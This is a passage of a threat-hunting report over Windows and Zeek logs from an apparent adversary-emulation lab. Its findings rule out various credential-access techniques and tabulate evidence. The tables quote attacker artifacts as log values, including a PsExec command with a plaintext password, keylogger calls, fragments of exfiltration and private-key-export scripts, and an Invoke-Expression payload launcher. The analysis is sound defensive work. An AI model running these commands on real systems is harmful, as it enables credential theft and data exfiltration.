Hunting for T1111 (Multi-Factor Authentication Interception) produced no evidence of MFA-provider, smartcard, NGC/Wbio or PhoneFactor artifacts: a search across windows.sysmon for win.TargetFilename/win.ImageLoaded/registry.path containing MultiFactor, MFA, Ngc, Wbio or PhoneFactor returned 0 hits, and no MFA/OTP interception tooling was observed. The LSASS process-access hits (326 events, win.TargetImage *lsass*) are dominated by C:\windows\system32\svchost.exe (289) plus Azure antimalware/telemetry agents (AntimalwareConfig.exe 15, WindowsAzureTelemetryService.exe 13). The rare high-access handles are native components: wininit.exe and csrss.exe with 0x1fffff and wininit.exe with 0x1000000 on scranton.dmevals.local at 2020-05-02T03:19:09.803Z (consistent with a boot/init sequence), svchost.exe with 0x101001 at 03:18:34.438Z and 0x3000 at 03:19:59.323Z, and wsmprovhost.exe with 0x1f3fff on nashua.dmevals.local at 03:09:29.430Z whose call trace runs through System.ni.dll and Microsoft.PowerShell.Commands.Management.ni.dll (a PowerShell remoting session, not credential theft). PowerShell.exe on scranton.dmevals.local opened lsass with 0x1f3fff at 03:05:16.623Z and 0x1fffff at 03:05:16.654Z, but the call trace is ntdll.dll/KERNELBASE.dll plus an UNKNOWN module and the account is NT AUTHORITY\SYSTEM (S-1-5-18); the only PowerShell script block on that host referencing tokens/privileges is a Get-AttributesMask helper (SE_GROUP_* constants) run by pbeesly from C:\Program Files\SysinternalsSuite\readme.ps1 at 2020-05-01T23:04:04, i.e. token/privilege enumeration, not MFA interception. The SmartCardRoot registry reads on scranton are generic certificate-store enumeration by powershell.exe and consent.exe. Note: the host does show other malicious activity (a .scr from C:\ProgramData\victim\ reading the LSA registry key as pbeesly), but that is credential-access/LSA reconnaissance, not MFA interception, so T1111 itself is not observed.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:19:09.803Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpq9JAt | q-72b775d6dd | ok |
| 2 | 2020-05-02 03:19:09.803Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\windows\system32\csrss.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpq9JAu | q-72b775d6dd | ok |
| 3 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | process.executable | C:\windows\system32\wsmprovhost.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkw4a_B | q-e7fbe4ec00 | ok |
| 4 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQr3J | q-2ac73498c7 | ok |
| 5 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.AccountName | SYSTEM | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQr3J | q-2ac73498c7 | ok |
| 6 | 2020-05-02 03:04:04.000Z | scranton.dmevals.local | windows.powershell | win.Path | C:\Program Files\SysinternalsSuite\readme.ps1 | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHpH1uOFchItwCkCwA | q-63a9b98bec | ok |
| 7 | 2020-05-02 02:56:14.969Z | scranton.dmevals.local | windows.sysmon | registry.path | HKU\S-1-5-21-1830255721-3727074217-2423397540-1107\Software\Microsoft\SystemCertificates\SmartCardRoot | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpk0gjm | q-28ce3bce03 | ok |

### F21 · benign / medium · T1187 · No forced-authentication (T1187) activity observed; SMB traffic is internal System-process client traffic

Evidence status: **verified**

All 66 outbound SMB (139/445) connections in windows.sysmon were generated by process.executable 'System' (the kernel SMB client) on newyork, nashua, scranton and utica, and every destination was an internal address (10.0.0.4, 10.0.1.6, fe80::e40c:95b6:b0a7:6429) — normal domain-controller/file-server traffic, not attacker-controlled SMB/WebDAV listeners. The only shortcut written to a Startup folder (C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\hostui.lnk) was created by PowerShell on scranton and targets a local binary, not a UNC/WebDAV path, so it is not a forced-auth .lnk. The single NTLM-related event (LsaSrv 6038 on scranton) is the standard once-per-boot informational warning that NTLM is in use, not evidence of coercion. No WebDAV/DavWWWRoot/@SSL paths, no 4104 script blocks referencing WebDAV/NTLM/Responder/PetitPotam, and no SMB share access to attacker shares were found.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:01:43.033Z | scranton.dmevals.local | windows.sysmon | process.executable | System | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpIWWNw | q-feaae43faa | ok |
| 2 | 2020-05-02 03:01:43.033Z | scranton.dmevals.local | windows.sysmon | destination.ip | 10.0.0.4 | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpIWWNw | q-feaae43faa | ok |
| 3 | 2020-05-02 02:56:48.006Z | newyork.dmevals.local | windows.sysmon | destination.ip | fe80:0:0:0:e40c:95b6:b0a7:6429 | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpizV0l | q-feaae43faa | ok |
| 4 | 2020-05-02 03:04:23.681Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\hostui.lnk | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpESdr2 | q-084cebc986 | ok |
| 5 | 2020-05-02 03:20:41.000Z | scranton.dmevals.local | windows.other | event.code | 6038 | .ds-logs-windows.other-default-2026.10.17-000001 / AaFHo31uOFchItyZYWW2 | q-04522e62ed | ok |

### F23 · benign / medium · T1212 · No exploitation of lsass for credential access; credential theft on scranton was keystroke capture plus plaintext credential reuse

Evidence status: **verified**

The T1212 hypothesis (exploitation for credential access) is not supported by the lsass access telemetry. Of 326 Sysmon event.code 10 accesses to C:\windows\system32\lsass.exe, 293 used GrantedAccess 0x1000 and 24 used 0x1400, and the high-access outliers are attributable to Windows components: svchost.exe (0x101001 via lsm.dll, 0x3000 via sysmain.dll), wininit.exe/csrss.exe (0x1fffff/0x1000000 at 03:19:09 during session-manager activity) and services.exe (0x1000 via RPCRT4). The two PowerShell.exe accesses on scranton.dmevals.local at 03:05:16 (0x1f3fff and 0x1fffff, CallTrace ending in UNKNOWN(000001996D28200D)) and the wsmprovhost.exe access on nashua.dmevals.local at 03:09:29 (0x1f3fff, CallTrace through System.ni.dll / Microsoft.PowerShell.Commands.Management.ni.dll) show managed PowerShell call stacks, i.e. .NET/PowerShell process enumeration rather than an injected memory-dumping payload; no Mimikatz/sekurlsa/procdump strings exist in any 4104 script block (C118 zero hits) and no lsass/mimikatz/procdump text in windows.other (C119 zero hits). The credential access that IS present on scranton.dmevals.local by user pbeesly is a different technique: a custom PowerShell toolkit (Keystroke-Check / Get-Keystrokes / View-Job 'Keystrokes' at 03:06:47-03:07:49, Invoke-BeachCleanup, Invoke-Exfil) plus plaintext credential use in PsExec64.exe -u dmevals\pbeesly -p <password> \\NASHUA at 03:11:18, followed by Kerberos/network logons as pbeesly to nashua.dmevals.local (8 type-3 Kerberos from 10.0.1.4, 8 type-2). Kerberos ticket activity (C116/C117) only shows pbeesly and machine accounts requesting normal SPNs (NEWYORK$, NASHUA$, SCRANTON$, krbtgt, WEC$). So T1212 exploitation for credential access is not observed; the intrusion itself is malicious but belongs to keystroke logging / credential reuse.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.654Z | scranton.dmevals.local | windows.sysmon | win.CallTrace | C:\windows\SYSTEM32\ntdll.dll+9c584\|C:\windows\System32\KERNELBASE.dll+2732e\|UNKNOWN(000001996D28200D) | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQr3J | q-2225e4eea8 | ok |
| 2 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.CallTrace | C:\windows\SYSTEM32\ntdll.dll+9c584\|C:\windows\System32\KERNELBASE.dll+2732e\|C:\windows\assembly\NativeImages_v4.0.30319_64\System\9803982d7bc887e2745bff18a43… | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkw4a_B | q-7c72e70a75 | ok |
| 3 | 2020-05-02 03:19:09.803Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\windows\system32\wininit.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpq9JAt | q-04eab78af7 | ok |
| 4 | 2020-05-02 03:18:34.438Z | scranton.dmevals.local | windows.sysmon | win.CallTrace | C:\windows\SYSTEM32\ntdll.dll+9def4\|c:\windows\system32\lsm.dll+1aa6e\|c:\windows\system32\lsm.dll+1a9c3\|c:\windows\system32\lsm.dll+65e1\|c:\windows\system32… | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkady05 | q-04eab78af7 | ok |
| 5 | 2020-05-02 03:06:59.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | Get-Keystrokes;Start-Sleep -Seconds 15;View-Job -JobName "Keystrokes" | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHpH1uOFchItwAjopf | q-1d1d9fbeab | ok |
| 6 | 2020-05-02 03:11:18.784Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItku2r93 | q-c68e147d23 | ok |
| 7 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-Exfil {      if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershe… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHo31uOFchItz5hds0 | q-a598635b87 | ok |

### F24 · benign / high · T1539 · No web session cookie theft observed; browser-store hits are Windows Search indexing and normal Edge activity

Evidence status: **verified**

Across all four hosts (2020-05-02 02:55–03:28Z) no event shows a browser cookie/credential store being read, copied or exfiltrated. The C121 'Cookies/Login Data/Web Data' file-creation hits were false positives: the top values are lastalive0/1.dat and GroupPolicy DataStore files, plus one Edge _TempTestAccess.txt written by MicrosoftEdge.exe itself on scranton. The only INetCookies creation is a per-package container file written by svchost.exe (LocalService) on scranton at 03:21:05Z, i.e. normal Windows app-container behaviour. The C123 hits are four SearchProtocolHost.exe launches (parent SearchIndexer.exe) on scranton/nashua whose command line merely contains the Windows Search robot user-agent string — benign indexing. The C124 PowerShell hits on newyork are SYSTEM module manifests/localized-string blocks (xStorage, DNSClientCache, Nano-server test) that only mention 'chrome' incidentally; the scranton pbeesly blocks are the APT29-style toolkit (Invoke-ScreenCapture, Invoke-Exfil, Get-PrivateKeys, Invoke-BeachCleanup) which target screenshots, certificates and Downloads archives, not cookies. The only 'cookie' strings in process command lines are rundll32.exe davclnt.dll,DavSetCookie calls by pbeesly on scranton (03:08:50–03:10:23Z) — WebDAV auth cookies created for the \\192.168.0.4\webdav exfil drive, not stolen browser cookies. PowerShell did open MicrosoftEdge.exe/MicrosoftEdgeCP.exe/MicrosoftEdgeSH.exe with GrantedAccess 0x1fffff at 03:05:17Z on scranton, but no subsequent cookie-store file access (4663 on Cookies/Login Data/Web Data = 0 rows) or credential-dumping tooling (sharpweb/lazagne/mimikatz/sqlite command lines = 0 rows) followed. T1539 is therefore not observed; the credential-access activity present on scranton is certificate export (Get-PrivateKeys) and plaintext credentials in scripts, which fall outside this technique.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:21:05.681Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Windows\ServiceProfiles\LocalService\AppData\Local\Packages\warp_jit_db4a1097-b484-4973-bbf2-a04208ecd4d4\AC\INetCookies | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkKNZkz | q-40a2f8e6e9 | ok |
| 2 | 2020-05-02 03:21:05.198Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Users\pbeesly\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\MicrosoftEdge\User\Default\DataStore\_TempTestAccess.txt | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkKNpkH | q-b91e9838de | ok |
| 3 | 2020-05-02 02:57:01.000Z | scranton.dmevals.local | windows.security | process.command_line | "C:\windows\system32\SearchProtocolHost.exe" Global\UsGthrFltPipeMssGthrPipe6_ Global\UsGthrCtrlFltPipeMssGthrPipe6 1 -2147483646 "Software\Microsoft\Windows Se… | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwxXBOw | q-efd3299666 | ok |
| 4 | 2020-05-02 03:08:50.846Z | scranton.dmevals.local | windows.sysmon | process.command_line | rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkx5Y1- | q-2b0a4e2d0a | ok |
| 5 | 2020-05-02 03:05:17.076Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1fffff | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQr1M | q-46aba1813c | ok |
| 6 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Get-PrivateKeys {     $mypwd = ConvertTo-SecureString -String "saribas" -Force -AsPlainText     $CertPaths = Get-ChildItem -Path cert:\LocalMachine -Re… | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHpH1uOFchItwCkSzI | q-a4c200b810 | ok |

### F27 · benign / medium · T1552.002 · Registry credential-key writes are Windows/IdentityCRL service noise, not harvesting

Evidence status: **verified**

The 26 registry SetValue events touching Password/Credential/Winlogon/SAM paths are all routine OS activity: IdentityCRL ProviderPasswordLength/CharacterGroups, Winlogon PasswordExpiryNotification and VolatileUserMgrKey, CredentialEnrollmentManagerUserSvc_13619b service registration, DeviceGuard CredentialGuard\Enabled, and MuiCache entries. No reg query / reg save of HKLM\SAM or LSA Secrets was observed (the reg-query process check returned zero hits), and no process command line referenced SAM or NTDS. The single HKLM\SAM\SAM\Domains\Account\F write is a normal SAM hive value update, not a dump.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:57.460Z | scranton.dmevals.local | windows.sysmon | event.code | 11 | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQ71_ | q-34d0a74633 | ok |

### F28 · benign / medium · T1552.003 · No shell-history access observed

Evidence status: **verified**

All checks for ConsoleHost_history, Get-History, and history-file creation/access returned zero hits across windows.powershell, windows.sysmon and windows.security. The only windows.other process/file events were Hyper-V NIC miniport and time-change messages on scranton, unrelated to history files.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:02:46.000Z | scranton.dmevals.local | windows.other | message | Miniport NIC 'Microsoft Hyper-V Network Adapter' restarted | .ds-logs-windows.other-default-2026.10.17-000001 / AaFHo31uOFchItyZYmUF | q-3cb875b8cc | ok |

### F29 · benign / medium · T1552.006 · No Group Policy Preferences / SYSVOL credential access observed

Evidence status: **verified**

No script block, process command line, SMB 5145 relative target, or file-creation event referenced Groups.xml, cpassword, gpprefdecrypt or SYSVOL. The only SYSVOL-adjacent artifact is a routine gpt.ini write under C:\Windows\System32\GroupPolicy\DataStore by the Group Policy client, which is normal policy processing.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:57.460Z | scranton.dmevals.local | windows.sysmon | event.code | 11 | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQ71_ | q-34d0a74633 | ok |

### F32 · benign / medium · T1555.003 · No browser credential-store access observed

Evidence status: **verified**

Checks for browser credential artefacts (Login Data, Cookies, Web Data, Local State) in Sysmon file-create, process-creation, Security 4663 object access and PowerShell script blocks all returned zero hits, and the windows.other file/process events for event.code 11/1 were only Hyper-V miniport, time-change and file-system-filter messages on scranton. No evidence of web-browser credential theft in this window.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:02:46.000Z | scranton.dmevals.local | windows.other | message | Miniport NIC 'Microsoft Hyper-V Network Adapter' restarted | .ds-logs-windows.other-default-2026.10.17-000001 / AaFHo31uOFchItyZYmUF | q-3c42249f5f | ok |

### F33 · benign / medium · T1555.004 · No Windows Credential Manager / vault access observed

Evidence status: **verified**

No process-creation or script-block activity referencing vault, cmdkey, CredentialManager or Get-StoredCredential was found in Sysmon, Security or PowerShell. The only credential-related windows.other event is a benign boot-time 'Credential Guard configuration: 0x0, 0' message on scranton. The LSASS access reported under T1555 is memory-based credential theft, not Credential Manager vault access.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:19:09.000Z | scranton.dmevals.local | windows.other | message | Credential Guard configuration: 0x0, 0 | .ds-logs-windows.other-default-2026.10.17-000001 / AaFHo31uOFchItyZYWX1 | q-5758884f2e | ok |

### F34 · benign / medium · T1555.005 · No password-manager access observed

Evidence status: **verified**

Searches for KeePass, 1Password, LastPass, Bitwarden and .kdbx across Sysmon process creation, Sysmon process access, Security 4688 and PowerShell script blocks returned zero hits, and windows.other had no matching events. No password-manager theft activity in this window.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:16.623Z | scranton.dmevals.local | windows.sysmon | win.TargetImage | C:\windows\system32\lsass.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpCQr3G | q-fbf54bd0c0 | ok |

### F37 · benign / high · T1556.002 · No password filter DLL registration; LSA registry writes are lsass.exe boot-time values

Evidence status: **verified**

The only registry writes under Control\Lsa on scranton.dmevals.local were made by C:\windows\system32\lsass.exe itself at 03:19:09-03:19:10 (LsaPid = 0x2ec, LsaCfgFlagsDefault = 0, ProductType = 6), i.e. normal LSA startup state, not a Notification Packages / password filter registration. No file creation of a filter DLL in System32 or \Lsa\ was found, no 4657/4656 events referencing Notification Packages, and the only modules loaded into LSASS were the standard cryptdll.dll (32) and lsass.exe (1).

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:19:10.368Z | scranton.dmevals.local | windows.sysmon | registry.path | HKLM\System\CurrentControlSet\Control\Lsa\ProductType | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpq9JBe | q-875d8d319d | ok |
| 2 | 2020-05-02 03:19:09.865Z | scranton.dmevals.local | windows.sysmon | win.Details | DWORD (0x00000000) | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpq9JAz | q-875d8d319d | ok |

### F38 · benign / high · T1556.005 · Reversible-encryption PowerShell hit is a benign DSC module file

Evidence status: **verified**

The single 4104 script block matching Set-ADUser/Set-ADAccountControl on newyork.dmevals.local (SYSTEM, 03:01:30) is the Microsoft xActiveDirectory DSC resource file C:\Program Files\WindowsPowerShell\Modules\xActiveDirectory\DscResources\MSFT_xADCommon\MSFT_xADCommon.ps1, containing only help text and helper functions. No 4739 (domain policy change) events, no reversible-encryption commands in 4103/4104 or process command lines, and no other-channel references were found.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:01:30.000Z | newyork.dmevals.local | windows.powershell | win.Path | C:\Program Files\WindowsPowerShell\Modules\xActiveDirectory\DscResources\MSFT_xADCommon\MSFT_xADCommon.ps1 | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHpH1uOFchItwDl0_c | q-8b6e2f1dc0 | ok |

### F39 · benign / medium · T1556.006 · No MFA / authentication-policy modification observed

Evidence status: **verified**

No 4739 domain-policy-change events, no 5136 directory-service changes, and no process command lines referencing ADUser/ADAuthenticationPolicy/dsacls were found in the window. Network logons (4624 type 3) are dominated by machine accounts (NEWYORK$ 123, SCRANTON$ 37, NASHUA$ 25) plus pbeesly 20, consistent with normal domain traffic; nothing indicates MFA was disabled or bypassed.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:11:40.000Z | nashua.dmevals.local | windows.security | process.executable | C:\Windows\PSEXESVC.exe | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwjE0ff | q-e4698fc64d | ok |

### F41 · benign / high · T1556.008 · No Network Provider DLL registration or drop

Evidence status: **verified**

No registry writes to a NetworkProvider key (Sysmon 13) and no 4657 events referencing NetworkProvider were found. File creations in System32 were dominated by ProvTool.exe (329) and svchost.exe (30) with no DLL written to a NetworkProvider path; the only lsass.exe file creation was a single event with no associated NetworkProvider artifact.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:19:09.809Z | scranton.dmevals.local | windows.sysmon | process.command_line | C:\windows\system32\lsass.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpq9JAs | q-2a95474afa | ok |

### F42 · benign / medium · T1557 · No adversary-in-the-middle positioning observed; credential theft on scranton/nashua used direct C2 and PsExec instead

Evidence status: **verified**

Across windows.sysmon, windows.security, windows.other and zeek there is no evidence of an attacker interposing on network traffic. Sysmon event 22 DNS queries (81 total) contain only normal AD/DC discovery and Microsoft/telemetry lookups (NEWYORK.dmevals.local, _ldap._tcp.dc._msdcs.SCRANTON, wpad, v10.events.data.microsoft.com). Sysmon event 3 destinations are ordinary internal hosts plus public Microsoft/Azure addresses. The 4663/4656/4670 object-access stack is dominated by routine registry auditing (Session Manager\Environment, Lsa, Winlogon). The genuine malicious activity in this window is credential theft executed directly on hosts by user pbeesly (registry-stored payload run via Invoke-Expression on scranton, PsExec service installs on nashua, python.exe C2 to 192.168.0.4:8443), which is not AiTM.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:21:28.000Z | scranton.dmevals.local | windows.powershell | powershell.script_block.text | Get-ItemPropertyValue 'HKLM:\\SOFTWARE\Javasoft' 'value Supplement' \| Invoke-Expression | .ds-logs-windows.powershell-default-2026.10.17-000001 / AaFHpH1uOFchItwIqjKK | q-ef512c1d11 | ok |
| 2 | 2020-05-02 03:15:05.142Z | nashua.dmevals.local | windows.sysmon | process.executable | C:\Windows\Temp\python.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItknvJ-S | q-03b09e2c11 | ok |
| 3 | 2020-05-02 03:11:39.000Z | nashua.dmevals.local | windows.other | message | A service was installed in the system.    Service Name:  PSEXESVC  Service File Name:  %SystemRoot%\PSEXESVC.exe  Service Type:  user mode service  Service Star… | .ds-logs-windows.other-default-2026.10.17-000001 / AaFHo31uOFchItyZYWV3 | q-5923671c10 | ok |

### F43 · benign / medium · T1557.001 · SMB traffic is normal Kerberos domain authentication; no LLMNR/NBT-NS poisoning or SMB relay

Evidence status: **verified**

Zeek conn records to port 445/139 show only 10.0.1.4 and 10.0.1.6 talking SMB to the domain controller 10.0.0.4 with krb/gssapi service identification, plus host-to-host SMB between 10.0.1.4 and 10.0.1.6 — consistent with normal domain logons, not relay. The only SMB attempts to 192.168.0.4 (445/139) were rejected (conn_state REJ) and were followed by HTTP to the same host, i.e. attacker C2 probing rather than a relay target. Sysmon 22 shows no LLMNR/NBT-NS style single-label lookups being answered by an unexpected host; the single-label queries (NASHUA, SCRANTON, NEWYORK, wpad) are ordinary and wpad.dmevals.local returned NXDOMAIN. Network logons (4624 type 3) are Kerberos from 10.0.1.4 for pbeesly and machine accounts, with no NTLM relay pattern. Service installs (4697/7045) are PsExec (PSEXESVC) and javamtsup by pbeesly, plus per-user svchost services — lateral movement, not relay.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-04-30 00:06:38.903Z | simplerockbuild.simplerock.lan | zeek | zeek.service | krb,smb,gssapi | .ds-logs-zeek-default-2026.10.17-000001 / AaFHpH1uOFchItylr4ud | q-2e67a6b60f | ok |
| 2 | 2020-04-30 00:32:14.891Z | simplerockbuild.simplerock.lan | zeek | zeek.conn_state | REJ | .ds-logs-zeek-default-2026.10.17-000001 / AaFHpH1uOFchItylrovU | q-2e67a6b60f | ok |
| 3 | 2020-04-30 00:07:59.132Z | simplerockbuild.simplerock.lan | zeek | dns.question.name | wpad.dmevals.local | .ds-logs-zeek-default-2026.10.17-000001 / AaFHpH1uOFchItylrouG | q-83752ce04c | ok |
| 4 | 2020-05-02 03:04:04.000Z | newyork.dmevals.local | windows.security | win.AuthenticationPackageName | Kerberos | .ds-logs-windows.security-default-2026.10.17-000001 / AaFHo31uOFchItwqO44j | q-6be720fb5f | ok |

### F44 · benign / low · T1557.002 · No ARP cache poisoning indicators; connection destinations are stable and expected

Evidence status: **verified**

No ARP-level telemetry exists in these datasets, and the indirect indicators are clean: Sysmon event 3 destinations are consistent internal hosts (10.0.0.4, 10.0.1.4, 10.0.1.6, 192.168.0.4) and public Microsoft/Azure ranges, with no duplicated or shifting gateway MAC/IP pattern. DNS answers in zeek resolve internal names to their correct addresses (newyork.dmevals.local -> 10.0.0.4, nashua.dmevals.local -> 10.0.1.6, wec.dmevals.local -> 10.0.1.10). Network logons (4624 type 3) are Kerberos from 10.0.1.4, not replayed NTLM. The one anomalous TLS event is a self-signed certificate notice from 10.0.1.4 to 192.168.0.5:443, which is the attacker's own C2 endpoint contacted directly by the compromised host, not traffic redirected by ARP poisoning.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-04-30 00:15:18.392Z | simplerockbuild.simplerock.lan | zeek | zeek.note | SSL::Invalid_Server_Cert | .ds-logs-zeek-default-2026.10.17-000001 / AaFHpH1uOFchItylrovu | q-83752ce04c | ok |
| 2 | 2020-04-30 00:33:26.294Z | simplerockbuild.simplerock.lan | zeek | dns.answers | ["10.0.1.6"] | .ds-logs-zeek-default-2026.10.17-000001 / AaFHpH1uOFchItylrot8 | q-83752ce04c | ok |
| 3 | 2020-05-02 02:58:45.688Z | scranton.dmevals.local | windows.sysmon | destination.ip | 192.168.0.5 | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpfwJ9Y | q-03b09e2c11 | ok |

### F45 · benign / high · T1557.003 · No rogue DHCP server or DHCP option tampering; ipconfig/netsh activity is Azure Network Watcher

Evidence status: **verified**

The only DHCP/network-configuration process activity is on scranton.dmevals.local at 03:19Z: netsh.exe 'trace start capture=yes' and 'trace stop' plus three 'ipconfig.exe /all' runs, all executed as NT AUTHORITY\SYSTEM with parent process NetworkWatcherAgent.exe (Microsoft Azure Network Watcher agent) — a benign diagnostic capture, not DHCP spoofing. Zeek has no traffic to UDP 67/68 (no DHCP server or client conversations), and windows.other contains no DHCP server events (1341/1342/1020/1063) and no PowerShell DHCP cmdlets. Logon process names for 4624 are Kerberos/Advapi/User32/NtLmSsp, with no unusual authentication source.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:19:17.154Z | scranton.dmevals.local | windows.sysmon | win.ParentImage | C:\Packages\Plugins\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\1.4.1421.1\NetworkWatcherAgent\NetworkWatcherAgent.exe | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItkYcTxy | q-cf05fdf632 | ok |
| 2 | 2020-05-02 03:19:24.192Z | scranton.dmevals.local | windows.sysmon | process.command_line | "ipconfig.exe" /all | .ds-logs-windows.sysmon-default-2026.10.17-000001 / AaFHon1uOFchItpp7sSn | q-65340f6c75 | ok |

### F46 · benign / medium · T1558 · No Kerberos ticket theft/forgery observed; LSASS accesses are SYSTEM-context and unrelated to ticket abuse

Evidence status: **verified**

